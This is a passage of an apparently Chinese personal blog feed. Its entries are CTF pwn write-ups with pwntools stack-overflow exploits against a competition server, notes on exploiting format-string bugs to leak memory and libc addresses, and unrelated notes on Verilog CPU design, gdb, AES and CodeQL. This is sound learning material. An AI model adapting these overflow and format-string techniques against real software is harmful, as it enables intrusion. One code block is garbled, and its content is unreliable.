class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    addr_brew_coffee = <span class="hljs-number">0x0804856B</span><br>    offset = <span class="hljs-number">0x28</span> + <span class="hljs-number">4</span><br>    payload = <span class="hljs-string">b&quot;A&quot;</span> * offset + p32(addr_brew_coffee)<br>    <span class="hljs-comment"># r = process(&quot;./first_visit&quot;)</span><br>    r = remote(<span class="hljs-string">&quot;chals1.apoorvctf.xyz&quot;</span>, <span class="hljs-number">3001</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Barista: &#x27;What will you have?&#x27;&quot;</span>, payload)    <br>    r.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>本地<br><img src="/2024/10/29/hello-world/file-20250301121431350.png"></p><p>远程<br><img src="/2024/10/29/hello-world/file-20250301121341165.png"></p><h1 id="kogarashicafe-the-secret"><a href="#kogarashicafe-the-secret" class="headerlink" title="kogarashicafe - the secret"></a>kogarashicafe - the secret</h1><p>典型的格式化字符串漏洞——泄漏内存</p><p><img src="/2024/10/29/hello-world/file-20250301141504988.png"><br><img src="/2024/10/29/hello-world/file-20250301141900173.png"></p><p><a href="https://www.qqxiuzi.cn/bianma/ascii.htm">ASCII编码转换，ASCII码在线查询工具</a></p><blockquote><p>关于字节 小端序 字长 还是需要再研究一下</p></blockquote><h1 id="kogarashicafe-the-forbidden-recipe"><a href="#kogarashicafe-the-forbidden-recipe" class="headerlink" title="kogarashicafe - the forbidden recipe"></a>kogarashicafe - the forbidden recipe</h1><p>非常简单的栈溢出，入门级签到题</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch=<span class="hljs-string">&#x27;i386&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    offset = <span class="hljs-number">0x20</span><br>    var_v2 = -<span class="hljs-number">557122643</span> &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    var_v3 = <span class="hljs-number">12648243</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + p32(var_v2) + p32(var_v3)<br>    <span class="hljs-comment"># nc chals1.apoorvctf.xyz 3002</span><br>    r = remote(<span class="hljs-string">&quot;chals1.apoorvctf.xyz&quot;</span>, <span class="hljs-number">3002</span>)<br>    <span class="hljs-comment"># r = process(&quot;./forbidden_recipe&quot;)</span><br>    r.sendlineafter(<span class="hljs-string">&quot;Barista: &#x27;I remember you... what will it be this time?&#x27;\n&quot;</span>, payload)<br>    r.interactive()<br>  <br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CPU设计</title>
    <link href="/2025/02/28/CPU%E8%AE%BE%E8%AE%A1/"/>
    <url>/2025/02/28/CPU%E8%AE%BE%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>WHU《计算机设计实践》课程实验</p></blockquote><p>使用工具：<br>Rars : risc-v汇编和运行时模拟器<br>ModelSim<br>vivado</p><p>编程语言：<br>Verilog<br>assembly</p><hr><h1 id="零基础扫盲"><a href="#零基础扫盲" class="headerlink" title="零基础扫盲"></a>零基础扫盲</h1><h2 id="什么是FPGA-Field-Programmable-Gate-Array-？"><a href="#什么是FPGA-Field-Programmable-Gate-Array-？" class="headerlink" title="什么是FPGA(Field Programmable Gate Array)？"></a>什么是FPGA(Field Programmable Gate Array)？</h2><p>FPGA，即<strong>现场可编程门阵列</strong>，是一种可完成通用功能的<strong>可编程逻辑芯片</strong>，即可以对其进行编程实现某种逻辑处理功能。</p><h2 id="FPGA与Verilog"><a href="#FPGA与Verilog" class="headerlink" title="FPGA与Verilog"></a>FPGA与Verilog</h2><p>Verilog用于描述和设计数字电路的功能和结构。设计者使用Verilog编写代码，定义电路的行为和连接方式。<br>编写完成的Verilog代码需要经过综合(Synthesis)，转化为门级网表（Netlist），然后进行布局布线（Place and Route），完成布局布线后，所有的逻辑单元和连接将被转化为特定的配置数据，这些数据用于配置FPGA的硬件资源。这些配置数据将会被保存为一个比特流文件（.bit文件），这个文件包含了所有FPGA硬件资源的配置指令，可以在FPGA上加载并执行。</p><h2 id="Vivado与ModelSim"><a href="#Vivado与ModelSim" class="headerlink" title="Vivado与ModelSim"></a>Vivado与ModelSim</h2><p>Vivado是 集成设计环境<br>ModelSim 具有强大的仿真功能</p><hr><h1 id="参考示例："><a href="#参考示例：" class="headerlink" title="参考示例："></a>参考示例：</h1><p>单周期CPU，支持14条指令</p><ul><li>add sub xor or and srl sra sll</li><li>lui addi lw</li><li>sw beq jal<br>单周期CPU ModelSim 仿真工程SCCPU_SIM<br>测试代码rv32_sc_sim.dat</li></ul><p>流水线CPU，支持12条指令</p><ul><li>add sub xor or and srl sra sll</li><li>lui addi lw</li><li>sw<br>流水线CPU ModelSim 仿真工程 PLCPU_SIM<br>测试代码rv32_pl_sim.dat</li></ul><hr><h1 id="示例工程及源码"><a href="#示例工程及源码" class="headerlink" title="示例工程及源码"></a>示例工程及源码</h1><p>\CODExp\demo\sccpu_sim\project\SCCPU_SIM：实现了14条指令单周期CPU的ModelSim示例工程<br>\CODExp\demo\sccpu_sim\source\ ：目录包含14条指令单周期CPU的ModelSim仿真代码<br>\CODExp\demo\sccpu_fpga\source\： 目录包含了14条指令单周期CPU的Vivado仿真代码及约束文件（在此基础上可以直接构建Vivado工程）</p><p>\CODExp\testcode\demo\目录包含示例单周期CPU和流水线CPU工程的测试代码（asm、dat文件）<br>\CODExp\testcode\task\目录包含设计目标单周期CPU和流水线CPU工程的测试代码（asm、dat或coe文件）</p><hr><h1 id="实验一——单周期CPU"><a href="#实验一——单周期CPU" class="headerlink" title="实验一——单周期CPU"></a>实验一——单周期CPU</h1><p>对示例单周期CPU进行指令扩展，至少支持以下指令<br>add sub xor or and srl sra sll<br>lui addi lw sw beq jal<br>&#x3D;&#x3D;增加指令<br>slt sltu andi ori xori<br>srli srai slli slti sltui<br>bne bge bgeu blt bltu &#x3D;&#x3D;</p><p>J型指令<br>jalr</p><hr><p>可能出现的问题：</p><ol><li>文件路径<br>全英文</li><li>文件找不到<br>最好用copy</li></ol><hr><h1 id="RARS使用"><a href="#RARS使用" class="headerlink" title="RARS使用"></a>RARS使用</h1><p><a href="https://github.com/TheThirdOne/rars/wiki">Home · TheThirdOne&#x2F;rars Wiki</a></p><hr><h1 id="ModelSim使用"><a href="#ModelSim使用" class="headerlink" title="ModelSim使用"></a>ModelSim使用</h1><hr><p><code>chardet</code> 是一个用于自动检测文本数据编码格式的 Python 库。它可以识别多种字符编码，如 UTF-8、GBK、ISO-8859-1 等，广泛应用于处理不同编码格式的文本数据时，帮助开发者避免乱码问题。</p><p><strong>安装：</strong></p><p>可以通过 <code>pip</code> 安装 <code>chardet</code>：</p><p>bash</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pip install chardet<br></code></pre></td></tr></table></figure><hr><p>vscode<br><a href="https://blog.csdn.net/weixin_62701327/article/details/136499646">如何在VSCode中优雅地书写Verilog_vscode verilog-CSDN博客</a></p><p><img src="/2024/10/29/hello-world/0250307160846465.png"></p><hr><p>ALU单元：<br>有A口、B口两个输入口接收数据<br>一个口接收ALUOp操作数<br>一个C口输出操作结果<br>一个口输出Zero信号<br>（用于指示是否是B型指令）<br>A、B、C都是32位</p><p>需要扩充的：</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs verilog"><span class="hljs-comment">// 有符号比较</span><br>  `ALUOp_slt:C=(<span class="hljs-built_in">$signed</span>(A) &lt; <span class="hljs-built_in">$signed</span>(B)) ? <span class="hljs-number">32&#x27;b1</span> : <span class="hljs-number">32&#x27;b0</span>;<br><span class="hljs-comment">// 无符号比较</span><br>      `ALUOp_sltu:C=(<span class="hljs-built_in">$unsigned</span>(A) &lt; <span class="hljs-built_in">$unsigned</span>(B)) ? <span class="hljs-number">32&#x27;b1</span> : <span class="hljs-number">32&#x27;b0</span>;<br><span class="hljs-comment">// 不相等跳转</span><br>      `ALUOp_bne:C=&#123;<span class="hljs-number">28&#x27;h0000000</span>,<span class="hljs-number">3&#x27;b000</span>,(A==B)&#125;; <br><span class="hljs-comment">// 小于跳转</span><br>      `ALUOp_blt:C=&#123;<span class="hljs-number">28&#x27;h0000000</span>,<span class="hljs-number">3&#x27;b000</span>,(A&gt;=B)&#125;; <br><span class="hljs-comment">// 大于等于跳转</span><br>      `ALUOp_bge:C=&#123;<span class="hljs-number">28&#x27;h0000000</span>,<span class="hljs-number">3&#x27;b000</span>,(A&lt;B)&#125;; <br><span class="hljs-comment">//  </span><br>      `ALUOp_bltu:C=&#123;<span class="hljs-number">28&#x27;h0000000</span>,<span class="hljs-number">3&#x27;b000</span>,(<span class="hljs-built_in">$unsigned</span>(A)&gt;=<span class="hljs-built_in">$unsigned</span>(B))&#125;; <br><span class="hljs-comment">// </span><br>      `ALUOp_bgeu:C=&#123;<span class="hljs-number">28&#x27;h0000000</span>,<span class="hljs-number">3&#x27;b000</span>,(<span class="hljs-built_in">$unsigned</span>(A)&lt;<span class="hljs-built_in">$unsigned</span>(B))&#125;; <br></code></pre></td></tr></table></figure><hr><p>过程中遇到的问题：<br>仿真时忘记关闭允许优化，导致不能add mov(失败)</p><h1 id="流水线CPU"><a href="#流水线CPU" class="headerlink" title="流水线CPU"></a>流水线CPU</h1>]]></content>
    
    
    <categories>
      
      <category>计组</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gdb操作</title>
    <link href="/2025/02/28/gdb%E6%93%8D%E4%BD%9C/"/>
    <url>/2025/02/28/gdb%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>gdb pwngdb pwbdbg操作<br>hex</p><h2 id="x命令"><a href="#x命令" class="headerlink" title="x命令"></a>x命令</h2><p>GDB的<code>x</code>命令用于<strong>直接查看内存内容</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">x/[选项] &lt;内存地址或表达式&gt;<br>x/[重复次数][格式][单位大小] [地址]<br></code></pre></td></tr></table></figure><p><strong>重复次数</strong><br>指定连续多少个内存单元<br><code>x/4xw</code>：以16进制格式(<code>x</code>)显示4个<code>word</code>（<code>w</code>）（4字节）的数据</p><p><strong>格式</strong></p><table><thead><tr><th>格式字符</th><th>说明</th></tr></thead><tbody><tr><td><code>x</code></td><td>十六进制</td></tr><tr><td><code>d</code></td><td>十进制有符号数</td></tr><tr><td><code>u</code></td><td>十进制无符号数</td></tr><tr><td><code>o</code></td><td>八进制</td></tr><tr><td><code>t</code></td><td>二进制（位模式）</td></tr><tr><td><code>c</code></td><td>ASCII字符</td></tr><tr><td><code>s</code></td><td>C风格字符串（以<code>\0</code>结尾）</td></tr><tr><td><code>i</code></td><td>反汇编指令</td></tr></tbody></table><p><strong>单位大小</strong></p><table><thead><tr><th>字符</th><th>大小</th><th>说明</th></tr></thead><tbody><tr><td><code>b</code></td><td>1字节</td><td>Byte（8位）</td></tr><tr><td><code>h</code></td><td>2字节</td><td>Half-word（16位）</td></tr><tr><td><code>w</code></td><td>4字节</td><td>Word（32位系统默认）</td></tr><tr><td><code>g</code></td><td>8字节</td><td>Giant-word（64位系统默认）</td></tr></tbody></table><p>地址或表达式<br>可以是变量名、寄存器（<code>$rip</code>、<code>$rsp</code>）、直接地址（<code>0x400000</code>）或表达式(<code>&amp;var</code>)</p><hr><p>pwndbg查找函数名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">info <span class="hljs-built_in">functions</span> &lt;func_name&gt;<br></code></pre></td></tr></table></figure><p>pwndbg删除断点</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">info b<br><span class="hljs-comment"># 查看断点信息</span><br><br>delete &lt;断点编号&gt;<br>d &lt;断点编号&gt;<br><span class="hljs-comment"># 删除断点</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>gcc编译链接操作</title>
    <link href="/2025/02/27/gcc%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C/"/>
    <url>/2025/02/27/gcc%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>编译成汇编文件(intel风格)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">gcc -S -masm=intel sample.c -o sample.s<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2025/02/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/02/26/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<blockquote><p>参考：<br><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-exploit/">利用 - CTF Wiki</a></p></blockquote><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p><em>格式化字符串函数</em></p><blockquote><p>可以接受可变数量的参数，</p></blockquote><p>将第一个参数作为格式化字符串，根据其来解析之后的参数。<br>通俗来讲，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串。</p><p>几乎所有的C&#x2F;C++程序都会利用格式化字符串函数来<strong>输出信息、调试程序、处理字符串</strong>。<br>一般来说，格式化字符串在利用的时候主要分为三个部分：</p><ul><li>格式化字符串函数</li><li>格式化字符串</li><li>后续参数，可选</li></ul><p>example:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float %4.2f&quot;</span>, <span class="hljs-string">&quot;red&quot;</span>, <span class="hljs-number">123456</span>, <span class="hljs-number">3.14</span>)<br></code></pre></td></tr></table></figure><p>在进入printf函数之前的栈布局：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs prolog">[stack bottom / high address]<br>...<br><span class="hljs-number">3.14</span><br><span class="hljs-number">123456</span><br>addr of <span class="hljs-string">&quot;red&quot;</span><br>addr of format string: <span class="hljs-symbol">Color</span> <span class="hljs-comment">%s...</span><br>[stack top / low address]<br></code></pre></td></tr></table></figure><p>在进入printf之后，函数首先获取第一个参数，一个一个读取其字符会遇到两种情况</p><ul><li>当前字符不是%，直接输出到响应标准输出</li><li>当前字符是%，继续读取下一个字符<ul><li>如果下一个字符是%，输出%</li><li>如果没字符，报错，也可能仍运行输出%【gcc version 11.4.0 (Ubuntu 11.4.0-1ubuntu1~22.04)】</li><li>如果有其它字符则根据字符，获取相应的参数，对其进行解析并输出</li></ul></li></ul><p>但是如果我们写成了这个样子:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Color %s, Number %d, Float $4.2f&quot;</span>);<br></code></pre></td></tr></table></figure><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？<br>程序仍然会运行，而且会将栈上存储格式化字符串地址的高地址方向的三块相应大小的内存区域分别解析为</p><ol><li>解析其地址(内存中的值)对应的字符串</li><li>解析其内容(内存中的值)对应的整型值</li><li>解析其内容(内存中的值)对应的浮点值</li></ol><p>对于2，3来说倒也无妨，<br>但是对于1来说，若内存块中的值是一个不可访问的地址，比如0，那么程序就会因此而崩溃。</p><h1 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h1><p>在上一部分，我们已经看到了格式化字符串漏洞的两个利用手段</p><ul><li>使程序崩溃，因为栈上方（高地址&#x2F;栈底）的内存处存到的地址大概率不可访问，利用<code>%s</code></li><li>查看进程内容，利用<code>%d</code>，<code>%f</code>输出栈上的内容</li></ul><h2 id="利用手段之泄漏内存"><a href="#利用手段之泄漏内存" class="headerlink" title="利用手段之泄漏内存"></a>利用手段之<em>泄漏内存</em></h2><p>获取我们所想要的内容</p><ul><li>泄漏栈内存<ul><li>获取某个变量的值   <code>%d</code></li><li>获取某个变量对应地址的内存 <code>%s</code></li></ul></li><li>泄漏任意地址内存<ul><li>利用GOT表得到libc函数地址，进而获取libc，进而获取其它libc函数地址</li><li>盲打，dump整个程序，获取有用的信息。</li></ul></li></ul><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">%n$x<br>%&lt;位置&gt;$&lt;格式&gt;<br>%5$x<br></code></pre></td></tr></table></figure><p><code>%n</code> 表示要访问第<code>n</code>个参数（位置参数，整数）（输出函数的第n+1个参数）<br><code>$x</code> 指定以16进制格式输出该参数的值<br><code>%5$x</code> 表示以十六进制输出第5个参数（输出函数的第6个参数）的值</p><blockquote><p>[!tip] Sum up</p><ol><li>利用<code>%x</code>来获取对应栈的内存，但建议使用<code>%p</code>,可以不用考虑位数的区别</li><li>利用<code>%s</code>来获取变量所对应地址的内容，只不过有零截断</li><li>利用<code>%order$x</code>来获取指定参数的值，利用<code>%order$s</code>来获取指定参数对应地址的内容</li></ol></blockquote><hr><h1 id="泄漏任意地址内存"><a href="#泄漏任意地址内存" class="headerlink" title="泄漏任意地址内存"></a>泄漏任意地址内存</h1><p>控制我们所要泄漏的变量的地址</p><p>获取某个指定地址addr的内容</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure><hr><p>格式符</p><table><thead><tr><th>格式符</th><th>用途</th></tr></thead><tbody><tr><td><code>%d</code></td><td>十进制有符号整数</td></tr><tr><td><code>%u</code></td><td>十进制无符号整数</td></tr><tr><td><code>%x</code></td><td>十六进制</td></tr><tr><td><code>%o</code></td><td>八进制</td></tr><tr><td><code>%f</code></td><td>浮点数</td></tr><tr><td><code>%e</code></td><td>科学计数法</td></tr><tr><td><code>%c</code></td><td>单个字符</td></tr><tr><td><code>%p</code></td><td>指针地址，支持ascii或转义字符（<code>\n</code>)</td></tr><tr><td><code>%s</code></td><td>字符串，需以<code>\0</code>结尾，否则可能越界</td></tr><tr><td><code>%n</code></td><td><strong>写入已输出的字符数</strong></td></tr></tbody></table><hr><p><img src="/2024/10/29/hello-world/e-20250226224707861.png"></p><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/135757524">【PWN · 格式化字符串|劫持fini_array|劫持got表】[CISCN 2019西南]PWN1-CSDN博客</a></p><blockquote><p>本文在一定程度上参考了各种推文、wiki</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>库函数与系统调用</title>
    <link href="/2024/12/07/libc/"/>
    <url>/2024/12/07/libc/</url>
    
    <content type="html"><![CDATA[<blockquote><p>介绍pwn中常见的libc函数</p></blockquote><p>库函数与系统调用</p><h1 id="atoi"><a href="#atoi" class="headerlink" title="atoi()"></a>atoi()</h1><p><strong>标准库函数</strong></p><blockquote><p>ASCII to Integer<br>将字符串转换为对应的整数值</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">atoi</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* str)</span>;<br></code></pre></td></tr></table></figure><h1 id="read"><a href="#read" class="headerlink" title="read()"></a>read()</h1><p><em><strong>系统调用</strong></em></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">void</span>* buf, <span class="hljs-type">size_t</span> count)</span>;<br>  <br>这样，你可以在程序运行时动态地分析 **glibc** 中的函数调用和行为。<br><br>### <span class="hljs-number">5.</span> **查看已经安装的库路径**<br><br>如果你对已经安装的 **glibc** 二进制文件中的实现感兴趣，虽然不能直接看到源代码，但可以使用工具来反汇编并分析其二进制```<br><br>---<br><span class="hljs-meta"># mmap()</span><br>`mmap`是一个用于内存映射的系统调用函数，在Linux和Unix-like系统中非常常见。它允许将一个文件或其他对象（设备、内存等）映射到进程的虚拟内存空间<br>可以通过<br>指针直接访问文件内容，无需读取和写入文件<br>```c<br><span class="hljs-type">void</span>* <span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br></code></pre></td></tr></table></figure><p>addr：建议的映射地址。如果传入NULL，操作系统会自动选择映射的地址<br>length：映射区域的长度，单位是字节<br>prot：指定映射区域的访问权限，通常是以下几个值的组合：</p><ul><li>PROT_READ：页可以被读取</li><li>PROT_WRITE：页可以被写入</li><li>PROT_EXEC：页可以被执行</li><li>PROT_NONE：页不能被访问<br>flags：映射的特性和行为，常见的值有：</li><li>MAP_SHARED：修改同步到文件或设备，适用于共享内存</li><li>MAP_PRIVATE：修改不会影响文件或设备，而是创建一个映射的副本，适用于私有内存</li><li>MAP_FIXED：如果映射地址已经有映射区域，它会被替换</li><li>MAP_ANONYMOUS：映射不与任何文件关联，通常用于申请匿名内存，<code>fd</code>必须为-1，offset也必须为0</li><li>fd：文件描述符，指向需要映射的文件。如果映射匿名内存，传入-1</li><li>offset：文件偏移量，表示映射内容在文件中的起始位置，映射必须是页大小的整数倍。</li></ul><hr><h1 id="阅读glibc源代码"><a href="#阅读glibc源代码" class="headerlink" title="阅读glibc源代码"></a>阅读glibc源代码</h1><p>通过<code>libc</code>库文件本身，无法直接查看其源代码。<br><code>libc</code>文件（<code>libc.so</code>或<code>libc.so.6</code>）是已经编译好的共享库，它们包含了库的二进制实现。</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>glibc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AES</title>
    <link href="/2024/11/26/AES/"/>
    <url>/2024/11/26/AES/</url>
    
    <content type="html"><![CDATA[<blockquote><p>密码学实验</p></blockquote><h1 id="AES算法的基本结构"><a href="#AES算法的基本结构" class="headerlink" title="AES算法的基本结构"></a>AES算法的基本结构</h1><p>输入：128位明文，128&#x2F;192&#x2F;256位密钥</p><p>子过程： </p><ol><li>S盒变换</li><li>行移位</li><li>列混合</li><li>轮密钥加</li></ol><p>输出： 128位密文</p><h1 id="AES算法的基本运算"><a href="#AES算法的基本运算" class="headerlink" title="AES算法的基本运算"></a>AES算法的基本运算</h1><ol><li><p>$GF(2^8)$上的加法</p></li><li><p>$GF(2^8)上的多项式加法$</p></li><li><p>$GF(2^8)上的乘法$</p><ol><li><p>借助xtime运算快速实现</p><ul><li>倍乘函数：移位运算（定义：${02} \cdot {??}$）</li><li>加法：异或运算<br> 由于$GF(2^8)$中的所有元素都可以表示为02的不同幂次的和，因此所有的乘法运算都能够通过重复调用北城函数和加法快速实现<br> 例：({}中表示16进制)<br> $$<br> \begin{aligned}<br> y \cdot {15} &amp;&#x3D;y\cdot {01 \oplus 04 \oplus 10} &#x3D; y\cdot {01 \oplus 02^2 \oplus 02^4}<br> \<br> &amp;&#x3D; y\oplus xtime(xtime(y)) \oplus xtime(xtime(xtime(xtime(y))))<br> \<br> &amp;&#x3D; y \oplus xtime(xtime(y\oplus xtime(xtime(y))))<br> \end{aligned}<br> $$<br> 更快速的方法：<br> 造表：将128所有乘法结果取值与计算，存入表中，直接查表</li></ul></li><li><p>借助生成元快速实现<br> $GF(2^8)$的全体<strong>非零元素</strong>对于 <em>乘法</em> 构成<strong>循环群</strong>。设$a$为<strong>生成元</strong>，则循环群<br> $G &#x3D; {a^0, a^1, … a^{254}}$<br> G中的乘法运算：<br> $a^p \cdot a^q &#x3D; a^{(p+q) mod 255}$<br> 于是可以把$GF(2^8)$上的乘法运算简化为整数的加法运算。</p><p> <em>零元素</em>00与任何元素相乘都得00</p></li></ol></li></ol><h1 id="编程实现"><a href="#编程实现" class="headerlink" title="编程实现"></a>编程实现</h1><ol><li>造表</li></ol>]]></content>
    
    
    <categories>
      
      <category>密码学</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>codeQL一命速通</title>
    <link href="/2024/11/12/codeQL/"/>
    <url>/2024/11/12/codeQL/</url>
    
    <content type="html"><![CDATA[<p>CodeQL能干啥：<br>编写查询。。。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">codeql database create ~/CodeQL/databases/codeql_demo --language=<span class="hljs-string">&quot;python&quot;</span> --source-root=<br></code></pre></td></tr></table></figure><p>CodeQL采用类似SQL的查询语言，但专为代码分析设计。</p><p>其语法主要围绕从代码中提取信息的操作，包括对象选择、路径探索和条件过滤。</p><p>CodeQL查询通常由以下几个部分组成：</p><ul><li>from：选择数据源，指定查询的对象</li><li>where：条件过滤，用于限制结果</li><li>select：返回查询的结果</li><li>order by：对结果进行排序</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ql">import javascript <br><br>//查找不安全的SQL查询<br>from DataFlow::Node source, DataFlow::Node sink<br>where <br>//选择通过用户<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>静态分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>伪随机</title>
    <link href="/2024/11/12/%E4%BC%AA%E9%9A%8F%E6%9C%BA/"/>
    <url>/2024/11/12/%E4%BC%AA%E9%9A%8F%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>DSBCTF-做不出来的签到题</title>
